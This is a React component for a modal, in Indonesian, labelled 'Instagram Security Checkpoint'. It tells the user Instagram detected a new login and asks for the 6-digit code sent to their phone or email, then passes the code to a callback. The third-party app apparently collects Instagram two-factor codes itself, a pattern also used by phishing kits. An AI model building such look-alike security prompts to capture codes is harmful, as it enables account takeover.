'use client';

import React, { useState } from 'react';
import { KeyRound, X, AlertCircle } from 'lucide-react';

interface ChallengeModalProps {
  isOpen: boolean;
  onClose: () => void;
  temporarySessionId: string;
  contactPoint?: string;
  onVerify: (code: string) => Promise<void>;
}

export default function ChallengeModal({
  isOpen,
  onClose,
  temporarySessionId,
  contactPoint,
  onVerify,
}: ChallengeModalProps) {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.trim().length !== 6) {
      setError('Masukkan 6-digit kode verifikasi');
      return;
    }
    setError(null);
    setIsLoading(true);
    try {
      await onVerify(code.trim());
      onClose();
    } catch (err: any) {
      setError(err?.message || 'Kode verifikasi tidak valid. Silakan coba lagi.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm p-4 transition-all">
      <div className="w-full max-w-[390px] bg-white rounded-3xl p-6 shadow-2xl relative animate-in fade-in slide-in-from-bottom duration-200">
        <button
          onClick={onClose}
          className="absolute top-5 right-5 text-slate-400 hover:text-slate-600 p-1 rounded-full hover:bg-slate-100"
        >
          <X size={20} />
        </button>

        <div className="flex items-center gap-3 mb-4">
          <div className="w-12 h-12 rounded-2xl bg-purple-100 text-[#5E3A9B] flex items-center justify-center">
            <KeyRound size={24} />
          </div>
          <div>
            <h3 className="text-lg font-bold text-[#1E1B4B]">Verifikasi Dua Langkah</h3>
            <p className="text-xs text-[#6B7280]">Instagram Security Checkpoint</p>
          </div>
        </div>

        <p className="text-sm text-slate-600 mb-4 leading-relaxed">
          Instagram mendeteksi login baru. Masukkan 6-digit kode verifikasi yang dikirimkan ke kontak Anda{' '}
          <strong className="text-[#1E1B4B]">{contactPoint || 'SMS / Email'}</strong>.
        </p>

        {error && (
          <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-xl flex items-center gap-2 text-xs text-red-600">
            <AlertCircle size={16} className="shrink-0" />
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              maxLength={6}
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
              placeholder="123456"
              className="w-full text-center tracking-[0.5em] text-2xl font-bold py-3.5 px-4 rounded-xl bg-slate-50 border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#5E3A9B] text-[#1E1B4B]"
              autoFocus
            />
          </div>

          <button
            type="submit"
            disabled={isLoading || code.length !== 6}
            className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#251245] to-[#5E3A9B] text-white font-semibold text-sm hover:opacity-95 transition-opacity disabled:opacity-50 shadow-lg shadow-purple-950/20"
          >
            {isLoading ? 'Memverifikasi...' : 'Verifikasi & Masuk'}
          </button>
        </form>
      </div>
    </div>
  );
}
